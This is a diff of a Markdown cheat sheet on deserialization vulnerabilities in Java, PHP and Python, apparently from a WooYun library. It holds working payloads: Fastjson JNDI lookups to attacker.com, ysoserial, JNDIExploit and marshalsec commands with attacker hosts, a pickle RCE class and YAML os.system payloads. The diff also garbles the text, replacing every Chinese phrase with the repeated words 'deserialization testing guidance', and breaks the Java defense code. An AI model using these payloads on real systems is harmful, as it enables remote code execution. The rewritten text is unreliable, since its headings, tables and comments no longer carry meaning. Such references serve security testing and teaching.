@@ -1,111 +1,111 @@
-# Web 安全 - 反序列化漏洞
+# Web deserialization testing guidance - deserialization testing guidance
 
-> 来源: WooYun 漏洞库 | 拆自 web-injection.md
+> deserialization testing guidance: WooYun deserialization testing guidance | deserialization testing guidance web-injection.md
 
-## 五、反序列化漏洞
+## deserialization testing guidance、deserialization testing guidance
 
-### 5.1 漏洞本质
-
-```
-序列化数据(不可信) -> 反序列化函数 -> 对象重构触发魔术方法/回调 -> 恶意逻辑执行
-```
-
-**核心公式**：反序列化RCE = 可控序列化输入 + 危险类在classpath/作用域内 + 可达的利用链(Gadget Chain)
-
-### 5.2 Java反序列化
-
-**检测标识**
+### 5.1 deserialization testing guidance
 
 ```
-二进制流: AC ED 00 05 (hex头部)
-Base64:   rO0AB (编码后头部)
-常见位置: Cookie、ViewState、JMX、RMI、T3协议、HTTP Body
+deserialization testing guidance(deserialization testing guidance) -> deserialization testing guidance -> deserialization testing guidance/deserialization testing guidance -> deserialization testing guidance
 ```
 
-**利用链速查**
+**deserialization testing guidance**：deserialization testing guidanceRCE = deserialization testing guidance + deserialization testing guidanceclasspath/deserialization testing guidance + deserialization testing guidance(Gadget Chain)
 
-| 利用链 | 依赖库 | 触发方式 | 工具 |
+### 5.2 Javadeserialization testing guidance
+
+**deserialization testing guidance**
+
+```
+deserialization testing guidance: AC ED 00 05 (hexdeserialization testing guidance)
+Base64:   rO0AB (deserialization testing guidance)
+deserialization testing guidance: Cookie、ViewState、JMX、RMI、T3deserialization testing guidance、HTTP Body
+```
+
+**deserialization testing guidance**
+
+| deserialization testing guidance | deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
 |--------|--------|----------|------|
 | Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
 | Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
-| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专用工具 |
-| Jackson | jackson-databind | 多态反序列化 | ysoserial |
-| JNDI注入 | JDK < 8u191 | LDAP/RMI远程类加载 | JNDIExploit/marshalsec |
+| Fastjson | fastjson < 1.2.68 | `@type` autoType | deserialization testing guidance/deserialization testing guidance |
+| Jackson | jackson-databind | deserialization testing guidance | ysoserial |
+| JNDIdeserialization testing guidance | JDK < 8u191 | LDAP/RMIdeserialization testing guidance | JNDIExploit/marshalsec |
 
-**Fastjson经典Payload**
+**Fastjsondeserialization testing guidancePayload**
 
 ```json
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
 
-// 1.2.47 缓存绕过
+// 1.2.47 deserialization testing guidance
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
 ```
 
-**工具链**
+**deserialization testing guidance**
 
 ```bash
-# ysoserial生成payload
+# ysoserialdeserialization testing guidancepayload
 java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
 
-# JNDI注入服务
+# JNDIdeserialization testing guidance
 java -jar JNDIExploit.jar -i attacker_ip
 
-# marshalsec启动恶意LDAP/RMI
+# marshalsecdeserialization testing guidanceLDAP/RMI
 java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
 ```
 
-### 5.3 PHP反序列化
+### 5.3 PHPdeserialization testing guidance
 
-**检测标识**
+**deserialization testing guidance**
 
 ```
-格式: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
-关键函数: unserialize(), phar://协议触发
+deserialization testing guidance: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
+deserialization testing guidance: unserialize(), phar://deserialization testing guidance
 ```
 
-**魔术方法利用链**
+**deserialization testing guidance**
 
-| 方法 | 触发时机 | 利用方式 |
+| deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
 |------|----------|----------|
-| `__wakeup()` | unserialize()调用时 | 属性覆盖→危险操作 |
-| `__destruct()` | 对象销毁时 | 文件删除/写入/命令执行 |
-| `__toString()` | 对象被当字符串使用 | 拼接进危险函数 |
-| `__call()` | 调用不存在的方法 | 链式调用跳板 |
+| `__wakeup()` | unserialize()deserialization testing guidance | deserialization testing guidance→deserialization testing guidance |
+| `__destruct()` | deserialization testing guidance | deserialization testing guidance/deserialization testing guidance/deserialization testing guidance |
+| `__toString()` | deserialization testing guidance | deserialization testing guidance |
+| `__call()` | deserialization testing guidance | deserialization testing guidance |
 
-**POP链构造思路**
+**POPdeserialization testing guidance**
 
 ```
-1. 找入口: __wakeup()/__destruct() 中调用$this->xxx属性的方法
-2. 跳板: 通过__toString()/__call()/__get() 链接到其他类
-3. 终点: 到达system()/eval()/file_put_contents()等危险函数
-4. 构造: 控制属性值使链路完整连通
+1. deserialization testing guidance: __wakeup()/__destruct() deserialization testing guidance$this->xxxdeserialization testing guidance
+2. deserialization testing guidance: deserialization testing guidance__toString()/__call()/__get() deserialization testing guidance
+3. deserialization testing guidance: deserialization testing guidancesystem()/eval()/file_put_contents()deserialization testing guidance
+4. deserialization testing guidance: deserialization testing guidance
 ```
 
-**Phar反序列化（无需unserialize调用）**
+**Phardeserialization testing guidance（deserialization testing guidanceunserializedeserialization testing guidance）**
 
 ```php
-// 文件操作函数触发phar://反序列化
+// deserialization testing guidancephar://deserialization testing guidance
 file_exists('phar://upload/evil.phar');
-is_dir('phar://upload/evil.jpg');      // 伪装为图片后缀
+is_dir('phar://upload/evil.jpg');      // deserialization testing guidance
 ```
 
-### 5.4 Python反序列化
+### 5.4 Pythondeserialization testing guidance
 
-**危险函数**
+**deserialization testing guidance**
 
 ```python
 import pickle, yaml, marshal
 
-# pickle - 最常见
-pickle.loads(data)      # 反序列化
-pickle.load(file)       # 从文件反序列化
+# pickle - deserialization testing guidance
+pickle.loads(data)      # deserialization testing guidance
+pickle.load(file)       # deserialization testing guidance
 
-# yaml - 需要Loader
-yaml.load(data)         # 默认不安全(旧版本)
-yaml.load(data, Loader=yaml.FullLoader)  # 限制加载
+# yaml - deserialization testing guidanceLoader
+yaml.load(data)         # deserialization testing guidance(deserialization testing guidance)
+yaml.load(data, Loader=yaml.FullLoader)  # deserialization testing guidance
 
-# marshal - 字节码级别
-marshal.loads(data)     # 加载代码对象
+# marshal - deserialization testing guidance
+marshal.loads(data)     # deserialization testing guidance
 ```
 
 **pickle RCE Payload**
@@ -118,7 +118,7 @@ class Exploit:
         return (os.system, ('whoami',))
 
 payload = pickle.dumps(Exploit())
-# 等价手工构造:
+# deserialization testing guidance:
 # pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
 ```
 
@@ -126,26 +126,26 @@ payload = pickle.dumps(Exploit())
 
 ```yaml
 !!python/object/apply:os.system ['whoami']
-# 或
+# deserialization testing guidance
 !!python/object/new:subprocess.check_output [['whoami']]
 ```
 
-### 5.5 防御措施
+### 5.5 deserialization testing guidance
 
 ```java
-// Java: ObjectInputStream白名单过滤
+// Java: ObjectInputStreamdeserialization testing guidance
 ObjectInputStream ois = new ObjectInputStream(input) {
-    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+    @Override protected Class< > resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
         if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
         return super.resolveClass(desc);
     }
 };
 ```
 
-- **Java**: 升级组件(Fastjson/Jackson/Commons-Collections)、关闭autoType、使用白名单反序列化过滤器
-- **PHP**: 避免unserialize()处理用户输入、使用json_decode替代、禁用phar://协议
-- **Python**: 使用`yaml.safe_load()`替代`yaml.load()`、禁止pickle处理不可信数据、使用JSON
-- **通用**: 避免原生序列化格式传输数据，统一使用JSON；对反序列化入口做签名/HMAC校验
+- **Java**: deserialization testing guidance(Fastjson/Jackson/Commons-Collections)、deserialization testing guidanceautoType、deserialization testing guidance
+- **PHP**: deserialization testing guidanceunserialize()deserialization testing guidance、deserialization testing guidancejson_decodedeserialization testing guidance、deserialization testing guidancephar://deserialization testing guidance
+- **Python**: deserialization testing guidance`yaml.safe_load()`deserialization testing guidance`yaml.load()`、deserialization testing guidancepickledeserialization testing guidance、deserialization testing guidanceJSON
+- **deserialization testing guidance**: deserialization testing guidance，deserialization testing guidanceJSON；deserialization testing guidance/HMACdeserialization testing guidance
 
 ---
 
